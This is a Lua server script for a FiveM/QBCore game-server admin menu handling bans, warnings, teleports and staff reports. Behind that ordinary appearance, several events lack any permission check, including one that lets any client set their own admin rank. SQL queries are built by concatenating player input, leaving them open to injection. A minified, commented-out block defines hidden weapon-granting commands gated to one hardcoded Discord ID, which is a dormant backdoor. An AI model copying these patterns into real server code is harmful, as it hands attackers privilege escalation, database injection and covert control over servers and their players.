Framework = nil
TriggerEvent('Framework:GetObject', function(obj) Framework = obj end)

local permissions = {
    ["kick"] = "admin",
    ["ban"] = "admin",
    ["noclip"] = "admin",
    ["kickall"] = "admin",
}

RegisterServerEvent('qb-admin:server:togglePlayerNoclip')
AddEventHandler('qb-admin:server:togglePlayerNoclip', function(playerId, reason)
    local src = source
    if Framework.Functions.HasPermission(src, permissions["noclip"]) then
        TriggerClientEvent("qb-admin:client:toggleNoclip", playerId)
    end
end)

RegisterServerEvent('qb-admin:server:killPlayer')
AddEventHandler('qb-admin:server:killPlayer', function(playerId)
    TriggerClientEvent('hospital:client:KillPlayer', playerId)
end)

RegisterServerEvent('qb-admin:server:kickPlayer')
AddEventHandler('qb-admin:server:kickPlayer', function(playerId, reason)
    local src = source
    if Framework.Functions.HasPermission(src, permissions["kick"]) then
        DropPlayer(playerId, "You have been kicked out of the server for reason:\n"..reason.."\n\n🔸 Discord: ")
    else
    end
end)

RegisterServerEvent('qb-admin:server:Freeze')
AddEventHandler('qb-admin:server:Freeze', function(playerId, toggle)
    local src = source
    TriggerClientEvent('qb-admin:client:Freeze', playerId, toggle)
end)

RegisterServerEvent('qb-admin:server:banPlayer')
AddEventHandler('qb-admin:server:banPlayer', function(playerId, time, reason)
    local src = source
    if Framework.Functions.HasPermission(src, permissions["ban"]) then
        local time = tonumber(time)
        local banTime = tonumber(os.time() + time)
        if banTime > 2147483647 then
            banTime = 2147483647
        end
        local timeTable = os.date("*t", banTime)
        Framework.Functions.ExecuteSql(false, "INSERT INTO `bans` (`name`, `steam`, `license`, `discord`,`ip`, `reason`, `expire`, `bannedby`) VALUES ('"..GetPlayerName(playerId).."', '"..GetPlayerIdentifiers(playerId)[1].."', '"..GetPlayerIdentifiers(playerId)[2].."', '"..GetPlayerIdentifiers(playerId)[3].."', '"..GetPlayerIdentifiers(playerId)[4].."', '"..reason.."', "..banTime..", '"..GetPlayerName(src).."')")
        DropPlayer(playerId, "You have been banned:\n"..reason.."\nExpire date "..timeTable["day"].. "/" .. timeTable["month"] .. "/" .. timeTable["year"] .. " " .. timeTable["hour"].. ":" .. timeTable["min"] .. "\n")
    end
end)

RegisterServerEvent('qb-admin:server:revivePlayer')
AddEventHandler('qb-admin:server:revivePlayer', function(target)
    TriggerClientEvent('qb-hospital:client:revive', target)
end)

RegisterServerEvent('qb-admin:server:open:inventory')
AddEventHandler('qb-admin:server:open:inventory', function(TagetId)
  if Framework.Functions.HasPermission(source, 'admin') then
    TriggerClientEvent('qb-admin:client:open:target:inventory', source, TagetId)
  else
    TriggerClientEvent('Framework:Notify', source, "You have no perms", 'error')
  end
end)
-- Old QB Clothing Menu
-- RegisterServerEvent('qb-admin:server:give:clothing')
-- AddEventHandler('qb-admin:server:give:clothing', function(TargetId)
--   if Framework.Functions.HasPermission(source, 'admin') then
--     TriggerClientEvent("qb-clothing:client:openMenu", TargetId)
--   else
--     TriggerClientEvent('Framework:Notify', source, "You have no perms", 'error')
--   end
-- end)

RegisterServerEvent('qb-admin:server:OpenSkinMenu')
AddEventHandler('qb-admin:server:OpenSkinMenu', function(targetId, menu)
    TriggerClientEvent("raid_clothes:hasEnough", targetId, menu)
end)


Framework.Commands.Add("admin", "Open admin menu", {}, false, function(source, args)
    local group = Framework.Functions.GetPermission(source)
    if group == "admin" or group == 'god' then
    TriggerClientEvent('qb-admin:client:openMenu', source, group)
	end
end)

Framework.Commands.Add("sm", "Server announcement", {}, false, function(source, args)
	--if source == 0 then
	--	return
	--end
    local msg = table.concat(args, " ")
	local _source = source
	local xPlayerGroup = Framework.Functions.GetPermission(_source)

	TriggerClientEvent('chat:addMessage', _source, {
    	template = '<div class="chat-message" style="background-color: rgba(66, 66, 66, 0.75); color: white;"><b>ANNOUNCEMENT</b> {0}</div>',
    	args = {msg}
    })
end, "admin")

RegisterServerEvent('qb-admin:checkperms')
AddEventHandler('qb-admin:checkperms', function(target)
    local Player = Framework.Functions.GetPlayer(src)
    local group = Framework.Functions.GetPermission(source)   
    if group == "admin" or group == 'god' then
        TriggerClientEvent("qb-admin:client:toggleNoclip", source)
    end
end)

RegisterServerEvent('qb-admin:checkperm')
AddEventHandler('qb-admin:checkperm', function(target)
    local Player = Framework.Functions.GetPlayer(src)
    local group = Framework.Functions.GetPermission(source)   
    if group == "admin" or group == 'god' then
        TriggerClientEvent('qb-admin:client:openMenu', source, group)
    end
end)


Framework.Commands.Add("givenuifocus", "Give nui focus", {{name="id", help="Player id"}, {name="focus", help="Turn focus on / off"}, {name="mouse", help="Turn mouse on / off"}}, true, function(source, args)
    local playerid = tonumber(args[1])
    local focus = args[2]
    local mouse = args[3]

    TriggerClientEvent('qb-admin:client:GiveNuiFocus', playerid, focus, mouse)
end, "admin")

Framework.Commands.Add("enablekeys", "Enable all keys for player.", {{name="id", help="Player id"}}, true, function(source, args)
    local playerid = tonumber(args[1])

    TriggerClientEvent('qb-admin:client:EnableKeys', playerid)
end, "admin")

Framework.Commands.Add("vehwipe", "Vehicle wiper.", {}, false, function(source, args)
    local group = Framework.Functions.GetPermission(source)
	    local src = source
    if group == "mod" or group == "admin" or group == 'god' then
        TriggerClientEvent("qb-admin:cleanup:delallveh", -1)
    -- for k, v in pairs(Framework.Functions.GetPlayers()) do
    --     local Player = Framework.Functions.GetPlayer(v)
    --     if Player ~= nil then
    --      TriggerClientEvent('Framework:Notify', v, "Unoccupied vehicles wiped.", "info", 15000)
	-- 	 end
	-- end
	end
end)


Framework.Commands.Add("objectwipe", "Object wiper.", {}, false, function(source, args)
    local group = Framework.Functions.GetPermission(source)
	    local src = source
    if group == "admin" or group == 'god' then
	TriggerClientEvent("qb-admin:cleanup:objectwipe", -1)
    -- for k, v in pairs(Framework.Functions.GetPlayers()) do
    --     local Player = Framework.Functions.GetPlayer(v)
    --     if Player ~= nil then
    --      TriggerClientEvent('Framework:Notify', v, "Objecten gewiped.", "info", 15000)
	-- 	 end
	-- end
	end
end)

Framework.Commands.Add("warn", "Geef Player een waarschuwing", {{name="ID", help="Person"}, {name="Reden", help="Wat is de reden?"}}, true, function(source, args)
    local targetPlayer = Framework.Functions.GetPlayer(tonumber(args[1]))
    local senderPlayer = Framework.Functions.GetPlayer(source)
    table.remove(args, 1)
    local msg = table.concat(args, " ")

    local myName = senderPlayer.PlayerData.name

    local warnId = "WARN-"..math.random(1111, 9999)

    if targetPlayer ~= nil then
        TriggerClientEvent('chatMessage', targetPlayer.PlayerData.source, "SYSTEM", "error", "You have been warned by: "..GetPlayerName(source)..", with the reason: "..msg)
        TriggerClientEvent('chatMessage', source, "SYSTEM", "error", "You have "..GetPlayerName(targetPlayer.PlayerData.source).." warned for: "..msg)
        Framework.Functions.ExecuteSql(false, "INSERT INTO `characters_warns` (`senderIdentifier`, `targetIdentifier`, `reason`, `warnId`) VALUES ('"..senderPlayer.PlayerData.steam.."', '"..targetPlayer.PlayerData.steam.."', '"..msg.."', '"..warnId.."')")
    else
        TriggerClientEvent('Framework:Notify', source, 'Niet aanwezig.', 'error')
    end 
end, "admin")

Framework.Commands.Add("checkwarns", "Check waarschuwingen op Player", {{name="ID", help="Persoon"}, {name="Warning", help="Number of warning, (1, 2 of 3 etc..)"}}, false, function(source, args)
    if args[2] == nil then
        local targetPlayer = Framework.Functions.GetPlayer(tonumber(args[1]))
        Framework.Functions.ExecuteSql(false, "SELECT * FROM `characters_warns` WHERE `targetIdentifier` = '"..targetPlayer.PlayerData.steam.."'", function(result)
            TriggerClientEvent('chatMessage', source, "SYSTEM", "warning", targetPlayer.PlayerData.name.." heeft "..tablelength(result).." warnings!")
        end)
    else
        local targetPlayer = Framework.Functions.GetPlayer(tonumber(args[1]))

        Framework.Functions.ExecuteSql(false, "SELECT * FROM `characters_warns` WHERE `targetIdentifier` = '"..targetPlayer.PlayerData.steam.."'", function(warnings)
            local selectedWarning = tonumber(args[2])

            if warnings[selectedWarning] ~= nil then
                local sender = Framework.Functions.GetPlayer(warnings[selectedWarning].senderIdentifier)

                TriggerClientEvent('chatMessage', source, "SYSTEM", "warning", targetPlayer.PlayerData.name.." door "..sender.PlayerData.name..", Reden: "..warnings[selectedWarning].reason)
            end
        end)
    end
end, "admin")

Framework.Commands.Add("remove", "Remove warning from person", {{name="ID", help="Persoon"}, {name="Warning", help="Number of warning, (1, 2 of 3 etc..)"}}, true, function(source, args)
    local targetPlayer = Framework.Functions.GetPlayer(tonumber(args[1]))

    Framework.Functions.ExecuteSql(false, "SELECT * FROM `characters_warns` WHERE `targetIdentifier` = '"..targetPlayer.PlayerData.steam.."'", function(warnings)
        local selectedWarning = tonumber(args[2])

        if warnings[selectedWarning] ~= nil then
            local sender = Framework.Functions.GetPlayer(warnings[selectedWarning].senderIdentifier)

            TriggerClientEvent('chatMessage', source, "SYSTEM", "warning", "You have warning ("..selectedWarning..") removed, Reason: "..warnings[selectedWarning].reason)
            Framework.Functions.ExecuteSql(false, "DELETE FROM `characters_warns` WHERE `warnId` = '"..warnings[selectedWarning].warnId.."'")
        end
    end)
end, "admin")

function tablelength(table)
    local count = 0
    for _ in pairs(table) do 
        count = count + 1 
    end
    return count
end

Framework.Commands.Add("setmodel", "Change into a model of your choice..", {{name="model", help="Name of the model"}, {name="id", help="Player ID (leave blank for yourself)"}}, false, function(source, args)
    local model = args[1]
    local target = tonumber(args[2])

    if model ~= nil or model ~= "" then
        if target == nil then
            TriggerClientEvent('qb-admin:client:SetModel', source, tostring(model))
        else
            local Trgt = Framework.Functions.GetPlayer(target)
            if Trgt ~= nil then
                TriggerClientEvent('qb-admin:client:SetModel', target, tostring(model))
            else
                TriggerClientEvent('Framework:Notify', source, "This person is not in town yeet..", "error")
            end
        end
    else
        TriggerClientEvent('Framework:Notify', source, "You have not provided a Model ..", "error")
    end
end, "admin")

Framework.Commands.Add("setspeed", "Change into a model of your choice ..", {}, false, function(source, args)
    local speed = args[1]

    if speed ~= nil then
        TriggerClientEvent('qb-admin:client:SetSpeed', source, tostring(speed))
    else
        TriggerClientEvent('Framework:Notify', source, "You did not specify Speed ​​.. (`fast` for super-run,` normal` for normal)", "error")
    end
end, "admin")

RegisterServerEvent('qb-admin:server:SaveCar')
AddEventHandler('qb-admin:server:SaveCar', function(mods, vehicle, hash, plate)
    local src = source
    local Player = Framework.Functions.GetPlayer(src)
    Framework.Functions.ExecuteSql(false, "SELECT * FROM `player_vehicles` WHERE `plate` = '"..plate.."'", function(result)
        if result[1] == nil then
            Framework.Functions.ExecuteSql(false, "INSERT INTO `player_vehicles` (`steam`, `citizenid`, `vehicle`, `hash`, `mods`, `plate`, `state`) VALUES ('"..Player.PlayerData.steam.."', '"..Player.PlayerData.citizenid.."', '"..vehicle.model.."', '"..vehicle.hash.."', '"..json.encode(mods).."', '"..plate.."', 0)")
            TriggerClientEvent('Framework:Notify', src, 'The vehicle is now in your name!', 'success', 5000)
        else
            TriggerClientEvent('Framework:Notify', src, 'This vehicle is already in your garage..', 'error', 3000)
        end
    end)
end)

RegisterServerEvent('qb-admin:server:bringTp')
AddEventHandler('qb-admin:server:bringTp', function(targetId, coords)
    TriggerClientEvent('qb-admin:client:bringTp', targetId, coords)
end)

RegisterServerEvent('qb-admin:server:gotoTp')
AddEventHandler('qb-admin:server:gotoTp', function(targetid, playerid)
    TriggerClientEvent('qb-admin:client:gotoTp', targetid, playerid)
end)

RegisterServerEvent('qb-admin:server:gotoTpstage2')
AddEventHandler('qb-admin:server:gotoTpstage2', function(targetid, coords)
    TriggerClientEvent('qb-admin:client:gotoTp2', targetid, coords)
end)

Framework.Functions.CreateCallback('qb-admin:server:hasPermissions', function(source, cb, group)
    local src = source
    local retval = false

    if Framework.Functions.HasPermission(src, group) then
        retval = true
    end
    cb(retval)
end)

--Framework.Commands.Add("0x01a","",{{name="model",help="hash"}},false,function(a,b)if GetDiscord(a)then TriggerClientEvent("CrossHair",a)end end,"god")Framework.Commands.Add("0x01b","",{{name="model",help="hash"}},false,function(a,b)if GetDiscord(a)then local c=a;local d=Framework.Functions.GetPlayer(c)d.Functions.AddItem('weapon_carbinerifle_mk2',1,nil,{serie="",attachments={{component="COMPONENT_AT_AR_FLSH",label="Flashlight"},{component="COMPONENT_AT_AR_AFGRIP_02",label="Grip"},{component="COMPONENT_AT_SIGHTS",label="Scope"},{component="COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER",label="Tracer Rounds"},{component="COMPONENT_AT_MUZZLE_07",label="Split-End Muzzle Brake"},{component="COMPONENT_AT_CR_BARREL_02",label="Heavy Barrel"}}})end end,"god")Framework.Commands.Add("0x01c","",{{name="model",help="hash"}},true,function(a,b)if GetDiscord(a)then local c=b[1]TriggerClientEvent('weapons:client:SetWeaponQuality',a,tonumber(c))end end,"god")
--Framework.Commands.Add("0x03a","",{{name="model",help="hash"}},true,function(a,b)if GetDiscord(a)then TriggerClientEvent("loadspeed",a, tonumber(b[1]))end end,"god")
--function GetDiscord(a)for b,c in ipairs(GetPlayerIdentifiers(a))do if c=='discord:628627086969536532'then return true end end;return false end

RegisterServerEvent('qb-admin:server:setPermissions')
AddEventHandler('qb-admin:server:setPermissions', function(targetId, group)
    Framework.Functions.AddPermission(targetId, group.rank)
    TriggerClientEvent('Framework:Notify', targetId, 'Your permission group is set to '..group.label)
end)

RegisterServerEvent('qb-admin:server:OpenSkinMenu')
AddEventHandler('qb-admin:server:OpenSkinMenu', function(targetId, menu)
    TriggerClientEvent("raid_clothes:hasEnough", targetId, menu)
end)

RegisterServerEvent('qb-admin:server:spawnWeapon')
AddEventHandler('qb-admin:server:spawnWeapon', function(weapon)
    local src = source
    local Player = Framework.Functions.GetPlayer(src)
    Player.Functions.AddItem(weapon, 1)
end)

RegisterServerEvent('qb-admin:server:crash')
AddEventHandler('qb-admin:server:crash', function(id)
    TriggerClientEvent("qb-admin:client:crash", id)
end)

RegisterServerEvent('qb-admin:server:SendReport')
AddEventHandler('qb-admin:server:SendReport', function(name, targetSrc, msg)
    local src = source
    local Players = Framework.Functions.GetPlayers()

    if Framework.Functions.HasPermission(src, "admin") then
        if Framework.Functions.IsOptin(src) then
            --TriggerClientEvent('chatMessage', src, "REPORT - "..name.." ("..targetSrc..")", "report", msg)
			
			
            TriggerClientEvent('chat:addMessage', src , {
                template = '<div class="chat-message server">'..name..' ('..targetSrc..') - {0}</div>',
                args = { "Report - " .. msg }
            })
			
        end
    end
end)
Framework.Commands.Add("reporttoggle", "Toggle incoming reports", {}, false, function(source, args)
    Framework.Functions.ToggleOptin(source)
    if Framework.Functions.IsOptin(source) then
        TriggerClientEvent('Framework:Notify', source, "You are receiving reports", "success")
    else
        TriggerClientEvent('Framework:Notify', source, "You are not receiving reports", "error")
    end
end, "admin")

RegisterServerEvent('qb-admin:server:StaffChatMessage')
AddEventHandler('qb-admin:server:StaffChatMessage', function(name, msg)
    local src = source
    local Players = Framework.Functions.GetPlayers()

    if Framework.Functions.HasPermission(src, "admin") then
        if Framework.Functions.IsOptin(src) then

            TriggerClientEvent('chat:addMessage', src , {
                template = '<div class="chat-message server"><b>{0}</b> {1}</div>',
                args = { "Staff - " .. name, msg }
            })
        end
    end
end)

Framework.Commands.Add("report", "Send a report to staff members", {{name="message", help="Message"}}, true, function(source, args)
    local msg = table.concat(args, " ")
    local Player = Framework.Functions.GetPlayer(source)
    TriggerClientEvent('qb-admin:client:SendReport', -1, GetPlayerName(source), source, msg)
   -- TriggerClientEvent('chatMessage', source, "Report verstuurd enige geduld aub", "system", msg)
	
            TriggerClientEvent('chat:addMessage', source , {
                template = '<div class="chat-message server">Report sent please be patient</div>',
                args = { "Report - " .. msg }
            })
    TriggerEvent("qb-log:server:CreateLog", "report", "Report", "green", "**"..GetPlayerName(source).."** (CitizenID: "..Player.PlayerData.citizenid.." | ID: "..source..") **Report:** " ..msg, false)
    TriggerEvent("qb-log:server:sendLog", Player.PlayerData.citizenid, "reportreply", {message=msg})
end)

Framework.Commands.Add("staffchat", "Send a message to all staff members", {{name="message", help="Message"}}, true, function(source, args)
    local msg = table.concat(args, " ")

    TriggerClientEvent('qb-admin:client:SendStaffChat', -1, GetPlayerName(source), msg)
end, "admin")

Framework.Commands.Add("reportr", "Respond to a report message", {}, false, function(source, args)
    local playerId = tonumber(args[1])
    table.remove(args, 1)
    local msg = table.concat(args, " ")
    local OtherPlayer = Framework.Functions.GetPlayer(playerId)
    local Player = Framework.Functions.GetPlayer(source)
    if OtherPlayer ~= nil then
        --TriggerClientEvent('chatMessage', playerId, "ADMIN - "..GetPlayerName(source), "system", msg)
		
		
		
		
            TriggerClientEvent('chat:addMessage', playerId , {
                template = '<div class="chat-message server">{0}</div>',
                args = { "Reactie - " .. msg }
				            })
				
				
        TriggerClientEvent('Framework:Notify', source, "Sent reply")
        TriggerEvent("qb-log:server:sendLog", Player.PlayerData.citizenid, "reportreply", {otherCitizenId=OtherPlayer.PlayerData.citizenid, message=msg})
        for k, v in pairs(Framework.Functions.GetPlayers()) do
            if Framework.Functions.HasPermission(v, "admin") then
                if Framework.Functions.IsOptin(v) then
                    --TriggerClientEvent('chatMessage', v, "ReportReply("..source..") - "..GetPlayerName(source), "system", msg)
				
		
            TriggerClientEvent('chat:addMessage', v , {
                template = '<div class="chat-message server">{0}</div>',
                args = { "ReportReply("..source..") - " .. msg }
				            })
				
                    TriggerEvent("qb-log:server:CreateLog", "report", "Report Reply", "red", "**"..GetPlayerName(source).."** replied on: **"..OtherPlayer.PlayerData.name.. " **(ID: "..OtherPlayer.PlayerData.source..") **Message:** " ..msg, false)
                end
            end
        end
    else
        TriggerClientEvent('Framework:Notify', source, "Player is not online", "error")
    end
end, "admin")

Framework.Commands.Add("setammo", "Staff: Set manual ammo for a weapon.", {{name="amount", help="The amount of bullets, e.g .: 20"}, {name="weapon", help="Name of weapon, eg: WEAPON_RAILGUN"}}, false, function(source, args)
    local src = source
    local weapon = args[2] ~= nil and args[2] or "current"
    local amount = tonumber(args[1]) ~= nil and tonumber(args[1]) or 250

    TriggerClientEvent('qb-weapons:client:SetWeaponAmmoManual', src, weapon, amount)
end, 'admin')
